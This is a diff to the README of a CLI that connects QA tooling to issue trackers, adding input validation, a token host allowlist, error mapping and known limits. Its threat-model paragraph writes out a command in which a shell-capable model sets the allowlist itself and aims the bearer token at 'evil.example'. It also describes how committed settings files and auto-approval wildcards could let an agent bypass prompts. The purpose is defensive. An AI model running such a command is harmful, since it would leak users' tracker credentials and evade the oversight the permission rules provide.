@@ -35,6 +35,11 @@ Same operations, same JSON in and out, same error shape — whichever tracker is
 Input shapes: [`schemas/tracker-inputs.schema.json`](../schemas/tracker-inputs.schema.json). Priorities are
 `High` / `Medium` / `Low`; each adapter maps them to its tracker's native scale.
 
+Those shapes are enforced, not just described: every input is checked against them (`VALIDATION`, before any request), and a test holds the code and
+the schema to the same answer for every case. In particular an id is letters, digits, `_` and `-` (at most 64) or a number, because it is placed in a URL;
+`limit` is a whole number from 1 to 100; `kind` is `any`, `bug` or `test`; `tcId` looks like `TC-001`. On GitHub a colon in a search query is dropped so
+the text cannot carry a qualifier such as `repo:other/private`.
+
 ## CLI
 
 ```bash
@@ -55,7 +60,19 @@ request back cannot leak one.
 
 **Where a token may be sent.** The base URL (from `--base-url`, `$QA_TRACKER_BASE_URL` or the config) is checked before
 the first request: `https` only, with plain `http` allowed solely for loopback (`localhost`, `127.x.x.x`, `[::1]`,
-`*.localhost`, i.e. local mocks); no embedded `user:pass@`, no query string or fragment. **Redirects are never followed**
+`*.localhost`, i.e. local mocks); no embedded `user:pass@`, no query string or fragment. The host must also be one the token belongs to: the tracker's own
+(`api.github.com`, `gitlab.com`, `dev.azure.com`, `api.clickup.com`, `api.bitbucket.org`), a reserved test host (`*.test`, loopback —
+what the mocks use), or one **you** allow in your own shell — `export QA_TRACKER_ALLOW_HOSTS=ghe.corp.example.com,*.git.corp.example.com`
+(exact names, or `*.suffix` with at least two labels — so do not write `*.co.uk` or `*.github.io`: that opens a whole public suffix). That is the only place it can be set: `qa-config.json` (including a committed
+profile) and a model-supplied `--base-url` can name a host, but cannot add one to the list, so a config cannot aim `Authorization: Bearer <token>`
+at a server of its choosing. GitHub Enterprise, self-hosted GitLab and Azure DevOps Server therefore need that one line. A `tokenEnvVar` the
+config names is the only variable read (GitHub no longer falls back to `GITHUB_TOKEN` / `GH_TOKEN` when it is unset: it stops with `CONFIG`).
+**What this does not protect against:** it separates the *config* and *flags* from your shell, not a model that can run its own shell
+commands: `QA_TRACKER_ALLOW_HOSTS=evil.example node scripts/tracker/cli.js fetch --base-url https://evil.example ...` sets it itself, as does an
+`env` block in a committed `.claude/settings.json`. Whether a permission rule such as `Bash(node scripts/tracker/cli.js fetch *)` matches a command with a
+leading environment assignment depends on Claude Code and was not tested here; keep such commands out of auto-approval, and review any `env` block in
+a repository's settings before trusting it.
+**Redirects are never followed**
 — a `3xx` is a `CONFIG` error naming where it pointed — so the credentials in a request cannot be forwarded elsewhere. stdin is only read
 with `--stdin`, so an inherited pipe can never hang an unattended run.
 
@@ -87,9 +104,9 @@ Every failure is normalized, so a caller never parses tracker-specific messages:
 |--------|---------|:-----------:|
 | `NOT_FOUND` | no such item (or not visible to this token) | no |
 | `UNAUTHENTICATED` / `FORBIDDEN` | bad credentials / not allowed | no |
-| `VALIDATION` | rejected as invalid — also bad input, caught **before any request** | no |
+| `VALIDATION` | rejected as invalid — also bad input, caught **before any request** — and **every 4xx the tracker answers with that has no other meaning here** (405, 410 "issues are disabled", 413, 451 …): repeating the same request cannot change it | no |
 | `CONFIG` | missing setting or env var — caught **before any request** | no |
-| `RATE_LIMITED` / `TIMEOUT` / `NETWORK` / `UPSTREAM_ERROR` | transient | **yes** |
+| `RATE_LIMITED` / `TIMEOUT` / `NETWORK` / `UPSTREAM_ERROR` | transient (429 and 425, 408, a dropped connection, a 5xx) | **yes** |
 
 ## "Closed" is not one thing: `open` and `dismissed`
 
@@ -119,6 +136,7 @@ regression: the vocabulary is per tracker and only as good as the words above. T
 - **`idempotencyKey` makes a manual retry safe.** Creates — and comments, so a re-run doesn't post its summary twice —
   embed a marker for the key (a body line, or a tag on Azure work items) and look for it first: a retry returns the original with `deduplicated: true`. The match is on the **whole key**: `bug-login` is not found inside `bug-login-2`, so a key that is a prefix of another cannot adopt that other item. This holds even when the
   first attempt *succeeded but the response was lost* — covered by a test that injects exactly that failure.
+- **The comment lookup reads every page, up to 1000 comments** (GitHub and GitLab take a page shorter than 100 as the end of the list, as the real servers return when asked for `per_page=100`; a proxy that caps pages below that would make the lookup miss a marker and post a duplicate. Bitbucket uses its `next` signal instead) (GitHub, GitLab, Bitbucket; 100 per page, pages requested by number — a `next` link in a response is only a signal that more exists, never a URL that is fetched, so it cannot steer the token to another host). If the marker is not among the first 1000 comments of a ticket that has more, the lookup **refuses** (`VALIDATION`, not retriable, "nothing was posted") rather than answer "not posted" and post a duplicate; post that comment without an `idempotencyKey` if you really want it. **Not covered:** ClickUp's comment list is paged by `start` / `start_id` and this adapter reads only its first page, which could not be verified without a real workspace; and `fetch` returns the first page of a ticket's comments (30 on GitHub, 100 on GitLab and Bitbucket), which is context for test generation, not a complete history.
 - **Multi-call creates can fail half-way** (ClickUp: task → checklist → steps). The error carries
   `details.partial.id`, and a retry **completes** the half-built item (`repaired: true`) rather than accepting it as
   done.
@@ -155,6 +173,13 @@ field names or required fields that differ from the docs, process templates (Azu
 the Basic process has none), token scopes and permissions, real rate-limit and pagination behavior, and how closely
 the real search index and error bodies match the mock. When a real run disagrees with a mock, fix the adapter **and**
 the mock so the contract suite catches it next time.
+
+Known limits that follow from that, found in review and left as they are:
+
+- **Bitbucket credentials.** The adapter authenticates with `username:app_password` (Basic). Atlassian has been retiring Bitbucket app passwords in favour of API tokens; whether the retirement has reached your workspace, and whether a token works in the same Basic slot, can only be seen against a real workspace. If authentication fails with a credential that works elsewhere, that is the first thing to check.
+- **`docs/settings.proposed.json` is a proposal, not something to apply on its own.** It allows `node scripts/tracker/cli.js fetch *` and `search *` without a prompt, and nothing in it asks before the same CLI is run with a different `--base-url`. The host allowlist above now stops a token reaching a host you did not allow, but apply the proposal together with the ask rules that come with the closed-loop work, not before.
+- **The same proposal's wildcards also cover write flags.** `cli.js fetch *`, `cli.js search *` and `normalize.js *` match `--context-file <path>` / `--out <path>`, which write JSON to any path without a prompt. Another reason to apply it only with the ask rules.
+- **`python` and `python3`.** The proposal allows `--version` for both because the prerequisite check accepts either; the runner scripts themselves are Node.
 
 To move a row to "yes": run the smoke test below against a scratch repo/project/list, put the report in the PR, and
 update this table in the same PR.
